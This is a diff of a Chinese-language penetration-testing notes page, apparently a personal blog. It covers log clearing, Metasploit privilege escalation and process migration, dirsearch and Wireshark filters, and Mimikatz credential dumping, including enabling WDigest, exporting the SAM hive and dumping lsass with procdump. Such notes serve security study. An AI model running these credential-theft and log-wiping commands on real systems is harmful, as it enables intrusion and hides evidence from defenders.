ntdsutil</span><br></code></pre></td></tr></table></figure>
 
-<h1 id="痕迹清理"><a href="#痕迹清理" class="headerlink" title="痕迹清理"></a>痕迹清理</h1><h2 id="windows-3"><a href="#windows-3" class="headerlink" title="windows"></a>windows</h2><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20240819105232499.png" srcset="/img/loading.gif" lazyload alt="image-20240819105232499"></p>
+
+
+
+
+
+
+<p>#痕迹清理</p>
+<h2 id="windows-3"><a href="#windows-3" class="headerlink" title="windows"></a>windows</h2><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20240819105232499.png" srcset="/img/loading.gif" lazyload alt="image-20240819105232499"></p>
 <p>1.查看事件日志 run event_manager -i</p>
 <p>2.删除事件日志 run event_manager -c</p>
 <p>3.clearv 命令清除目标系统的事件日志。</p>
@@ -785,7 +840,13 @@
 <p>history -c</p>
 <p>Linux</p>
 <p>Windows</p>
-<h1 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h1><h2 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h2><blockquote>
+<h1 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h1><h2 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h2><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20240917230028258.png" srcset="/img/loading.gif" lazyload alt="image-20240917230028258"></p>
+<p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/image-20240917230052008.png" srcset="/img/loading.gif" lazyload alt="image-20240917230052008"></p>
+<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs diff">常用参数<br><br><span class="hljs-deletion">-u -l指定url和url文件</span><br><br><span class="hljs-deletion">-e -X 包含和排除后缀 -f在字典后面增加后缀</span><br><br><span class="hljs-deletion">-w 指定字典</span><br><br><span class="hljs-deletion">-i -x 指定保留和排除的响应状态码</span><br><br>dirsearch.py -u url -e php -i 200<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h2><blockquote>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45588247/article/details/119614618">https://blog.csdn.net/weixin_45588247&#x2F;article&#x2F;details&#x2F;119614618</a><br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/164525">https://www.anquanke.com/post/id/164525</a></p>
 </blockquote>
 <h3 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h3><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/QqhVb8pD4oClfixKgowcNisJnqd.png" srcset="/img/loading.gif" lazyload alt="截图"></p>
@@ -820,7 +881,7 @@
 
 <h5 id="二-提权"><a href="#二-提权" class="headerlink" title="二.提权"></a>二.提权</h5><h6 id="1-绕过-UAC"><a href="#1-绕过-UAC" class="headerlink" title="1.绕过 UAC"></a>1.绕过 UAC</h6><p><img src="/2024/06/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/EeXObrz16oc7RpxMmuOc9d8Intc.png" srcset="/img/loading.gif" lazyload alt="截图"></p>
 <p>这里输入 background 挂起会话，使用 MSF 中的模块直接进行提权，在会话中输入 getsystem 即可</p>
-<h6 id="2-系统漏洞"><a href="#2-系统漏洞" class="headerlink" title="2.系统漏洞"></a>2.系统漏洞</h6><h6 id="-2"><a href="#-2" class="headerlink" title=""></a></h6><h5 id="三-进程迁移"><a href="#三-进程迁移" class="headerlink" title="三.进程迁移"></a>三.进程迁移</h5><p>将 msf 和进程进行绑定来降低被杀的概率</p>
+<h6 id="2-系统漏洞"><a href="#2-系统漏洞" class="headerlink" title="2.系统漏洞"></a>2.系统漏洞</h6><h6 id="-1"><a href="#-1" class="headerlink" title=""></a></h6><h5 id="三-进程迁移"><a href="#三-进程迁移" class="headerlink" title="三.进程迁移"></a>三.进程迁移</h5><p>将 msf 和进程进行绑定来降低被杀的概率</p>
 <p>1.查看进程 getpid</p>
 <p>2.查看正在运行进程 ps</p>
 <p>3.绑定 migratepid id</p>
@@ -851,11 +912,13 @@
 
 <h2 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a><strong>wireshark</strong></h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros">过滤源<span class="hljs-built_in"> ip </span>地址:ip.<span class="hljs-attribute">src</span>==1.1.1.1;,<br>目的<span class="hljs-built_in"> ip </span>地址:ip.<span class="hljs-attribute">dst</span>==1.1.1.1;<br>过滤 80 端口:tcp.<span class="hljs-attribute">port</span>==80,<br>源端口:tcp.<span class="hljs-attribute">srcport</span>==80,<br>目的端口:tcp.<span class="hljs-attribute">dstport</span>==80<br>协议直接输入,如 http 协议 http<br>过滤 get/post 包 http.request.<span class="hljs-attribute">mothod</span>==”GET/POST”<br>tcp http内容：tcp（http） contains <span class="hljs-string">&quot;/api&quot;</span><br>http url内容http.request.uri ==<span class="hljs-string">&quot;/api&quot;</span><br><br></code></pre></td></tr></table></figure>
 
-<h2 id="Mimikatz-1"><a href="#Mimikatz-1" class="headerlink" title="Mimikatz"></a>Mimikatz</h2><h3 id="明文密码"><a href="#明文密码" class="headerlink" title="明文密码"></a>明文密码</h3><p><code>提升权限 privilege::debug</code></p>
+<h2 id="Mimikatz-1"><a href="#Mimikatz-1" class="headerlink" title="Mimikatz"></a>Mimikatz</h2><h3 id="明文密码"><a href="#明文密码" class="headerlink" title="明文密码"></a>明文密码</h3><p>原理是抓lsass.exe的内存</p>
+<p><code>提升权限 privilege::debug</code></p>
 <p><code>抓取密码 sekurlsa::logonpasswords</code></p>
 <p><code>win10与2012R2后启动密码保存在内存中</code></p>
 <p><code>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</code> </p>
-<h3 id="sam表抓hash"><a href="#sam表抓hash" class="headerlink" title="sam表抓hash"></a>sam表抓hash</h3><p><code>导出SAM数据 reg save HKLM\SYSTEM SYSTEM reg save HKLM\SAM SAM</code> </p>
+<h3 id="sam表抓hash"><a href="#sam表抓hash" class="headerlink" title="sam表抓hash"></a>sam表抓hash</h3><p>利用sam表</p>
+<p><code>导出SAM数据 reg save HKLM\SYSTEM SYSTEM reg save HKLM\SAM SAM</code> </p>
 <p><code>使用mimikatz提取hash lsadump::sam /sam:SAM /system:SYSTEM</code></p>
 <h3 id="不落地"><a href="#不落地" class="headerlink" title="不落地"></a>不落地</h3><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">导出lsass procdump64.exe -accepteula -<span class="hljs-keyword">ma</span> lsass.exe lsass.dmp<br></code></pre></td></tr></table></figure>
 
